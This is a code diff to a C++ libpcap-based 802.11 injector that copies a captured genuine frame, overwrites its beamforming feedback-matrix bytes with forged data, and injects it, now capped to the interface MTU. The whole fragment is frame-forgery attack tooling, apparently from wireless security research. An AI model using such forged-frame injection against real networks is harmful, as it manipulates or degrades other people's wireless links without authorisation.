@@ -1,5 +1,10 @@
 #include "injector.h"
 #include <pcap.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <unistd.h>
+#include <algorithm>
 #include <cstring>
 #include <cstdio>
 #include <cmath>
@@ -128,26 +133,41 @@ bool Injector::inject_forged(const uint8_t* genuine_pkt,
     int mac_offset  = rt_len;
     int fcs_len     = 4;
 
-    int forged_total = RADIOTAP_HDR_LEN
-                     + (genuine_len - mac_offset - fcs_len);
+    int full_total = RADIOTAP_HDR_LEN
+                   + (genuine_len - mac_offset - fcs_len);
+
+    // Cap frame size to interface MTU + radiotap header length.
+    // Frames exceeding this are silently dropped by the kernel.
+    // MTU is set to 2304 at startup giving max injectable of 2316 bytes.
+    int iface_mtu = 1500;
+    {
+        struct ifreq ifr;
+        int sock = socket(AF_INET, SOCK_DGRAM, 0);
+        if (sock >= 0) {
+            strncpy(ifr.ifr_name, iface_.c_str(), IFNAMSIZ);
+            if (ioctl(sock, SIOCGIFMTU, &ifr) == 0)
+                iface_mtu = ifr.ifr_mtu;
+            close(sock);
+        }
+    }
+    int forged_total = std::min(full_total, iface_mtu + RADIOTAP_HDR_LEN);
 
     std::vector<uint8_t> buf(forged_total, 0);
 
     // Prepend our radiotap header
     memcpy(buf.data(), RADIOTAP_HDR, RADIOTAP_HDR_LEN);
 
-    // Copy 802.11 MAC header (24 bytes)
+    // Copy 802.11 MAC header + as much frame body as fits
+    int copy_len = std::min(genuine_len - mac_offset - fcs_len,
+                             forged_total - RADIOTAP_HDR_LEN);
     memcpy(buf.data() + RADIOTAP_HDR_LEN,
-           genuine_pkt + mac_offset,
-           genuine_len - mac_offset - fcs_len);
+           genuine_pkt + mac_offset, copy_len);
 
-    // Set retry bit in frame control byte 1 (bit 3)
-    buf[RADIOTAP_HDR_LEN + 1] |= 0x08;
-
-    // Overwrite feedback matrix bytes in the frame body
+    // Overwrite feedback matrix bytes with forged content
     int fb_start = RADIOTAP_HDR_LEN + 24 + feedback_offset_in_frame;
-    if (fb_start + feedback_len <= forged_total) {
-        memcpy(buf.data() + fb_start, forged_feedback, feedback_len);
+    int actual_fb = std::min(feedback_len, forged_total - fb_start);
+    if (actual_fb > 0 && fb_start < forged_total) {
+        memcpy(buf.data() + fb_start, forged_feedback, actual_fb);
     }
 
     int res = pcap_inject(send_handle_, buf.data(), forged_total);
